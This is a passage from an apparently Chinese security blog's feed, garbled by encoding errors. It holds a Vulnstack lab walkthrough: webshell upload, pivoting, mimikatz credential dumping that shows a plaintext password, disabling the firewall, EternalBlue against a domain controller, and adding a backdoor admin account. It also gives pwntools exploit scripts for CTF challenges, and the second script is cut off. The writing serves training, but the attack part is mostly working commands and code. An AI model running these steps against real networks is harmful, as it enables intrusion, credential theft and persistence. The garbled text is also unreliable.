class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>èšå‰‘è¿ä¸Šå»<br><img src="/Rxi134_FILE/22dcfc7cf6830bfcd2f039159866ae1e_MD5.jpeg"></p><h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>æ‹¿åˆ°äº†shellï¼Œä¸è¿‡å‘ç°æœ‰ä¸€ä¸ª yxcms ç›®å½•ï¼ˆæ•°æ®åº“é‡Œä¹Ÿæœ‰ newycms ï¼‰<br><img src="/Rxi134_FILE/5851e7a33c9394a25dc4c433b7c37f4d_MD5.jpeg"></p><p><img src="/Rxi134_FILE/075fe84d667cd331805108e924180898_MD5.jpeg"></p><p>ç›´æ¥è¿›å…¥åå°<br><img src="/Rxi134_FILE/60ad05e0511dbd0dcd4373500a1793b0_MD5.jpeg"><br>è¿™è¾¹åœ¨å‰å°å‘ç°å¯ä»¥æ›´æ”¹ç½‘ç«™æ¨¡æ¿<br><img src="/Rxi134_FILE/542275ea3a4be53c9a4eaeaf2b637cc0_MD5.jpeg"></p><p>åœ¨ç½‘ä¸ŠæŸ¥é˜…èµ„æ–™ï¼Œæ¨¡æ¿æ–‡ä»¶ä½äº <code>/protected/apps/admin/view/</code> ä¸‹<br><img src="/Rxi134_FILE/cdd86ad2510038db60db1008bbdaf1a0_MD5.jpeg"></p><p>å†™å…¥webshellå³å¯</p><h1 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h1><h2 id="å†…ç½‘ä»£ç†"><a href="#å†…ç½‘ä»£ç†" class="headerlink" title="å†…ç½‘ä»£ç†"></a>å†…ç½‘ä»£ç†</h2><p>è¿™è¾¹å‘ç°webæœåŠ¡å™¨å¤„åœ¨ GOD åŸŸ<br><img src="/Rxi134_FILE/62bde2c055f864a41df2359c7d2fc81b_MD5.jpeg"></p><p>ä½¿ç”¨ frp ä½œä¸ºåå‘ä»£ç†ï¼Œåå¼¹shellåˆ°msf<br><img src="/Rxi134_FILE/a9893884ef8ead61d86368998319d2ad_MD5.jpeg"><br><img src="/Rxi134_FILE/44f4483735f8b10879da4eab5d036ba8_MD5.jpeg"></p><p>ipconfig &#x2F;all å‘ç°äº†å…¶å®ƒç½‘æ®µï¼š192.168.52.0&#x2F;24</p><p>ç»™ msf æ·»åŠ ä¸€æ®µ session è·¯ç”±ï¼š<br><img src="/Rxi134_FILE/5dc634869627198f50e88c8072ad3f26_MD5.jpeg"></p><p>åˆ©ç”¨proxychains å®ç°å†…ç½‘ä»£ç†<br><img src="/Rxi134_FILE/d08d392b01088f46c2e8d78e40ad90c4_MD5.jpeg"></p><h2 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h2><p>win7æœºå™¨ã€‚ä¸»æœºåä¸º STU1<br><img src="/Rxi134_FILE/4888e3a5a05fa13d29462b3eb307baa9_MD5.jpeg"><br><img src="/Rxi134_FILE/2423b262365f3d131f5747fd526d113f_MD5.jpeg"></p><p>ç®¡ç†å‘˜æƒé™ï¼Œç›´æ¥è¿ç§»è¿›ç¨‹åˆ° lsass.exe<br><img src="/Rxi134_FILE/48c6914e05b0a6d30470d24219dc58dc_MD5.jpeg"></p><p>mimikatz æŠ“å–æ˜æ–‡å¯†ç ï¼š<code>god\Administrator:hongrisec@2019</code><br><img src="/Rxi134_FILE/ac5dbe258bda12ef7271887dd5ec77de_MD5.jpeg"></p><p>windowsé˜²ç«å¢™å¤„äºå¼€å¯çŠ¶æ€ï¼Œç›´æ¥å…³é—­</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">netsh advfirewall <span class="token function">set</span> allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¼€å¯è¿œç¨‹æ¡Œé¢</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">reg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a0ad78682d9f162654779ff0317b14aa_MD5.jpeg"></p><p><code>net view /domain</code>æŸ¥çœ‹æœ‰å‡ ä¸ªåŸŸï¼Œåªæœ‰GODä¸€ä¸ªåŸŸ<br><img src="/Rxi134_FILE/0f29f7520a5a593a4b331285e14e9af9_MD5.jpeg"></p><p><code>net view /domain:GOD</code>æŸ¥çœ‹GODåŸŸå†…æ‰€æœ‰ä¸»æœº<br><img src="/Red_FILE/7d6c6afce54bef7142e2bcb011f4dfda_MD5.jpeg"></p><p><code>net group /domain</code> æŸ¥çœ‹åŸŸç”¨æˆ·ç»„<br><img src="/Rxi134_FILE/f23f2d20a63f6b909801c35a6d5e5317_MD5.jpeg"></p><p><code>net group &quot;Domain Controllers&quot; /domain</code> ç¡®å®šDC<br><img src="/Rxi134_FILE/944a26e6658ee835bff7b566f2e3ae1f_MD5.jpeg"></p><p>æ—¢ç„¶åœ¨åŸŸå†…ï¼Œåˆ©ç”¨ netbiosåè®® æ¢æµ‹å†…ç½‘ä¸»æœº<br><img src="/Rxi134_FILE/25c5c05f8140aede807e09a51bd922ba_MD5.jpeg"><br>ç¡®å®š 141 çš„åŸŸPC ï¼Œå’Œ 138 çš„DC</p><h2 id="æ°¸æ’ä¹‹è“æ”»ç ´DCã€åŸŸPC"><a href="#æ°¸æ’ä¹‹è“æ”»ç ´DCã€åŸŸPC" class="headerlink" title="æ°¸æ’ä¹‹è“æ”»ç ´DCã€åŸŸPC"></a>æ°¸æ’ä¹‹è“æ”»ç ´DCã€åŸŸPC</h2><p>é€šè¿‡msfæ­å»ºsocks5éš§é“<br><img src="/Rxi134_FILE/7190ed049d8a421673767639b2135e54_MD5.jpeg"></p><p>proxfier æ£€æŸ¥<br><img src="/Rxi134_FILE/4a880d027642c2a0b6f1b0d6faa982f0_MD5.jpeg"></p><p>ç„¶åè®¾ç½®æµè§ˆå™¨ä»£ç†<br><img src="/Rxi134_FILE/939fb88fca8c009f7fbb65f45fd6424e_MD5.jpeg"></p><p>æˆåŠŸè®¿é—®åˆ°å†…ç½‘é‡Œ DC çš„80ç«¯å£<br><img src="/Rxi134_FILE/4eb1cbb89f9311facea2a54ee1beecce_MD5.jpeg"></p><p>ç«¯å£æ‰«æï¼Œåˆ©ç”¨  proxychains å°†æˆ‘ä»¬çš„æµé‡å¸¦å…¥å†…ç½‘</p><p>138 DCç«¯å£å¼€æ”¾æƒ…å†µï¼š<br><img src="/Rxi134_FILE/f28880db586a6aa81d22407edf3c5fe8_MD5.jpeg"></p><p>141 åŸŸPCç«¯å£å¼€æ”¾æƒ…å†µï¼š<br><img src="/Rxi134_FILE/194285cc6d827ef391a6b7dc176d4ef7_MD5.jpeg"></p><p>å¾ˆæ•æ„Ÿæƒ³åˆ°æ°¸æ’ä¹‹è“<br><img src="/Rxi134_FILE/56e0d75fedfb5066f1a0d1bae4133ed2_MD5.jpeg"></p><p>å…ˆæ‰“DC</p><pre class="line-numbers language-msf" data-language="msf"><code class="language-msf">msf6 &gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalbluemsf6 &gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpmsf6 &gt; set rhosts 192.168.52.138msf6 &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ä½†æ˜¯åå¼¹shellå¤±è´¥äº†ï¼Œç½‘ä¸ŠæŸ¥é˜…æ°¸æ’ä¹‹è“ç›´æ¥åå¼¹shellçš„å‡ ç‡è¿˜æ˜¯ä¸å¤§çš„</p><p>è¿™è¾¹ä½¿ç”¨ admin&#x2F;smb&#x2F;ms17_010_command æ¥æ‰§è¡Œå‘½ä»¤<br><img src="/Rxi134_FILE/8c31fb6cec07c86d799101be58d71c2e_MD5.jpeg"></p><p>é‚£å°±ç®€å•äº†ï¼Œæ·»åŠ ä¸€ä¸ªç”¨æˆ·å¹¶åŠ å…¥ç®¡ç†å‘˜ï¼ŒåŒæ—¶å¼€å¯è¿œç¨‹æ¡Œé¢</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">set</span> command net user x1nri Zzx<span class="token punctuation">.</span>123 <span class="token operator">/</span>addnet user x1nri <span class="token operator">/</span>active:yesnet localgroup Administrators x1nri <span class="token operator">/</span>addreg add <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server"</span> <span class="token operator">/</span>v fDenyTSConnections <span class="token operator">/</span>t REG_DWORD <span class="token operator">/</span>d 0 <span class="token operator">/</span>fnetsh advfirewall firewall add rule name=<span class="token string">"å…è®¸RDP"</span> protocol=TCP <span class="token function">dir</span>=in localport=3389 action=allow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è®¾ç½® proxifier ä»£ç†è§„åˆ™<br><img src="/Rxi134_FILE/00ceda9c0016f0832a563c6231c8db56_MD5.jpeg"></p><p>è¿œç¨‹æ¡Œé¢ç™»å½• <code>god\x1nri:Zzx.123</code>ï¼Œæ‹¿åˆ° DC çš„ shell<br><img src="/Rxi134_FILE/23a2af87a7ffda74e88781eaed7fc00d_MD5.jpeg"></p><p>ä¸Šä¼ mimikatzï¼Œä»¥ç®¡ç†å‘˜è¿è¡ŒæŠ“å–å¯†ç </p><pre class="line-numbers language-mimikatz" data-language="mimikatz"><code class="language-mimikatz">mimikatz # privilege::debugmimikatz # sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/Rxi134_FILE/70fe24cc8636b188b0930577bcec469b_MD5.jpeg"><br>æŠ“å–åˆ°å¯†ç ï¼ˆç¯å¢ƒæ­å»ºæ—¶æ”¹çš„å¯†ç ï¼‰ï¼š<code>liukaifeng01:HONGRISEC@2019</code>ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰æŠ“å–åˆ°administratorçš„å¯†ç </p><p>é€‰ä¸­å¿«é€Ÿç¼–è¾‘ï¼Œæ–¹ä¾¿å¤åˆ¶é»è´´<br><img src="/Rxi134_FILE/de5d490af01e9a90d3a0ad717bd8cfcd_MD5.jpeg"></p><p>è·³æ¿æœºæ— æ³•è¿è¡Œfrp<br><img src="/Rxi134_FILE/c09bb9abe5947989b47e91dce7ede880_MD5.jpeg"></p><p>å…³é—­é˜²ç«å¢™ï¼Œæ­£è¿æ‹¿åˆ°shell<br><img src="/Rxi134_FILE/c558ddc843f8c9a589e8be82428568da_MD5.jpeg"></p><p>åŒç†ï¼Œåˆ©ç”¨æ°¸æ’ä¹‹è“å†æ‹¿åˆ°åŸŸ PC shell </p><h1 id="åˆ©ç”¨CS"><a href="#åˆ©ç”¨CS" class="headerlink" title="åˆ©ç”¨CS"></a>åˆ©ç”¨CS</h1><p>è¿™è¾¹åˆ©ç”¨CSå†èµ°ä¸€éæµç¨‹ï¼ˆå¯¹CSä¸å¤ªç†Ÿï¼ŒåŠ æ·±ä¸‹ç†è§£ï¼‰ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯äºŒå¼€çš„CAT CS</p><p>è®¾ç½®ä¸€ä¸ªbeacon_httpçš„ç›‘å¬å™¨ï¼Œç›‘å¬80ç«¯å£<br><img src="/Rxi134_FILE/e2621704b1231742b5ea146581e5d4a1_MD5.jpeg"></p><p>ä¸Šçº¿webserverï¼Œç›´æ¥æ‹¿åˆ°äº†administratoræƒé™<br><img src="/Rxi134_FILE/07d69db871fd49c5e67a8d126118e452_MD5.jpeg"></p><p>è®¾ç½®å¿ƒè·³æ—¶é—´ï¼ˆè¿™é‡Œä¸æ˜¯çœŸå®ç¯å¢ƒç›´æ¥è®¾ä¸º0äº†ï¼‰<br><img src="/Rxi134_FILE/82e77dc5fb7aef4133d9651f2df74207_MD5.jpeg"></p><p>é€šè¿‡è‡ªå¸¦æ¨¡å— getsystem æå‡æƒé™åˆ°SYSTEMï¼Œå†é€šè¿‡è¿›ç¨‹æ³¨å…¥è¿”å›ä¸€ä¸ªæ–°çš„shell<br><img src="/Rxi134_FILE/25b63f034b9008bc32f18d9b32f215a5_MD5.jpeg"></p><p>net viewæ¢æµ‹åŸŸå†…ä¸»æœº<br><img src="/Rxi134_FILE/33b1dc2afcbab5f2afb38ef6cf43a33f_MD5.jpeg"></p><p>ä¸Šä¸€ä¸ªfscanå†…ç½‘å¤§ä¿å¥<br><img src="/Rxi134_FILE/79f4a4425c10ad714d943c7f01d71fca_MD5.jpeg"></p><p>æˆ‘ç”¨çš„äºŒå¼€CSï¼Œä¸èƒ½ç›´æ¥æ´¾ç”Ÿä¼šè¯ç»™msfï¼Œåªèƒ½é‡æ–°ä¸Šé©¬äº†</p><p>åœ¨ è·³æ¿æœº ä¸Šè®¾ç½®ä¸€ä¸ªæ–°çš„ä»£ç†ç›‘å¬å™¨<br><img src="/Rxi134_FILE/57a05d38484ff210802fc0ba4bb1dfc0_MD5.jpeg"></p><p>ä¹‹åå°±æ˜¯æ­£å¸¸ms17_010çš„åˆ©ç”¨ï¼Œç•¥</p><p>æ€»ç»“ï¼šCSçœŸæ–¹ä¾¿å“‡</p>]]></content>
      
      
      <categories>
          
          <category> è¿›æ”»æ€§æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstacké¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é•¿åŸæ¯äº¬æ´¥å†€2024åˆèµ›</title>
      <link href="/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/"/>
      <url>/2024/09/18/%E9%95%BF%E5%9F%8E%E6%9D%AF%E4%BA%AC%E6%B4%A5%E5%86%802024%E5%88%9D%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h1 id="flowershopï¼šç®€å•æ ˆæº¢å‡º"><a href="#flowershopï¼šç®€å•æ ˆæº¢å‡º" class="headerlink" title="flowershopï¼šç®€å•æ ˆæº¢å‡º"></a>flowershopï¼šç®€å•æ ˆæº¢å‡º</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'è¯·è¾“å…¥ä½ çš„é€‰é¡¹:'</span><span class="token punctuation">,</span>choice<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">shop</span><span class="token punctuation">(</span>buy<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:'</span><span class="token punctuation">,</span>buy<span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0'</span><span class="token punctuation">,</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x40</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">b'pwn'</span>payload<span class="token operator">=</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span>p32<span class="token punctuation">(</span><span class="token number">9999</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥ä½ çš„å§“å:"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>shop<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *0x0000000000400CE4'</span><span class="token punctuation">)</span>menu<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'è¯·è¾“å…¥è´­ä¹°çš„å•†å“åºå·:'</span><span class="token punctuation">,</span><span class="token string">'c'</span><span class="token punctuation">)</span>rdi<span class="token operator">=</span><span class="token number">0x0000000000400f13</span>ret<span class="token operator">=</span><span class="token number">0x00000000004006f6</span>system<span class="token operator">=</span>ep<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>binsh<span class="token operator">=</span><span class="token number">0x0000000000601840</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">0x18</span><span class="token operator">+</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>ret<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system<span class="token punctuation">]</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'ä½ æƒ³è¦ç»§ç»­ä¹°èŠ±å—? 1/0'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Kylin-Heapï¼šlibc2-31-æ— é™åˆ¶UAF"><a href="#Kylin-Heapï¼šlibc2-31-æ— é™åˆ¶UAF" class="headerlink" title="Kylin_Heapï¼šlibc2.31 æ— é™åˆ¶UAF"></a>Kylin_Heapï¼šlibc2.31 æ— é™åˆ¶UAF</h1><p>ç›´æ¥tcache æ‰“ __free_hook</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">:</span>sla<span class="token punctuation">(</span><span class="token string">'What will you do, adventurer?'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>choice<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'bytes): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'bytes):'</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sla<span class="token punctuation">(</span><span class="token string">'): '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span 